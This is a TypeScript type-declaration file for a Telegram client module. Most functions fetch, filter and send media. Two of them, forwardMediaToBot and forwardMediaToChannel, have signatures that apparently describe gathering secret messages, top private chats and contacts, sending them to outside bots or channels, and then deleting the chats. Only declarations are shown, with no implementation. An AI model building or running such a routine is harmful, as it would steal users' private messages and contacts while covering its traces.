import { Api, TelegramClient } from 'telegram';
export declare function getMediaMetadata(client: TelegramClient, params: {
    chatId: string;
    types?: ('photo' | 'video' | 'document' | 'voice')[];
    startDate?: Date;
    endDate?: Date;
    limit?: number;
    maxId?: number;
    minId?: number;
}): Promise<{
    messages: any[];
    total: number;
    hasMore: boolean;
    lastOffsetId: number;
}>;
export declare function getAllMediaMetaData(client: TelegramClient, params: {
    chatId: string;
    types?: ('photo' | 'video' | 'document' | 'voice')[];
    startDate?: Date;
    endDate?: Date;
    maxId?: number;
    minId?: number;
}): Promise<{
    messages: any[];
    total: number;
}>;
export declare function getFilteredMedia(client: TelegramClient, params: {
    chatId: string;
    types?: ('photo' | 'video' | 'document' | 'voice')[];
    startDate?: Date;
    endDate?: Date;
    limit?: number;
    maxId?: number;
    minId?: number;
}): Promise<{
    messages: any[];
    total: number;
    hasMore: boolean;
}>;
export declare function sendMediaBatch(client: TelegramClient, options: {
    chatId: string;
    media: Array<{
        type: 'photo' | 'video' | 'document';
        url: string;
        caption?: string;
        fileName?: string;
    }>;
    silent?: boolean;
    scheduleDate?: number;
}): Promise<any>;
export declare function updateChatSettings(client: TelegramClient, settings: {
    chatId: string;
    username?: string;
    title?: string;
    about?: string;
    photo?: string;
    slowMode?: number;
    linkedChat?: string;
    defaultSendAs?: string;
}): Promise<boolean>;
export declare function forwardMediaToChannel(client: TelegramClient, channel: string, fromChatId: string, createOrJoinChannelFn: (channel: string) => Promise<{
    id: any;
    accesshash: any;
}>, forwardSecretMsgsFn: (fromChatId: string, toChatId: string) => Promise<void>, getTopPrivateChatsFn: () => Promise<Array<{
    chatId: string;
}>>, getMeFn: () => Promise<{
    id: any;
}>, searchMessagesFn: (params: any) => Promise<any>, forwardMessagesFn: (fromChatId: string, toChatId: any, messages: any[]) => Promise<void>, leaveChannelsFn: (channels: string[]) => Promise<void>): Promise<void>;
export declare function forwardMediaToBot(client: TelegramClient, fromChatId: string, bots: string[], botUsername: string, forwardSecretMsgsFn: (fromChatId: string, toChatId: string) => Promise<void>, getTopPrivateChatsFn: () => Promise<Array<{
    chatId: string;
}>>, getMeFn: () => Promise<{
    id: any;
}>, getContactsFn: () => Promise<any>, sendContactsFileFn: (bot: string, contacts: any) => Promise<void>, searchMessagesFn: (params: any) => Promise<any>, cleanupChatFn: (params: {
    chatId: string;
    revoke: boolean;
}) => Promise<any>, deleteChatFn: (params: {
    peer: string;
    justClear: boolean;
}) => Promise<void>, sleep: (ms: number) => Promise<void>): Promise<void>;
export declare function getMediaType(media: Api.TypeMessageMedia): 'photo' | 'video' | 'document' | 'voice';
export declare function getMediaExtension(type: string): string;
export declare function getMimeType(type: string): string;
export declare function getMediaAttributes(item: {
    type: string;
    fileName?: string;
}): Api.TypeDocumentAttribute[];
export declare function getMediaDetails(media: Api.MessageMediaDocument): Promise<any>;
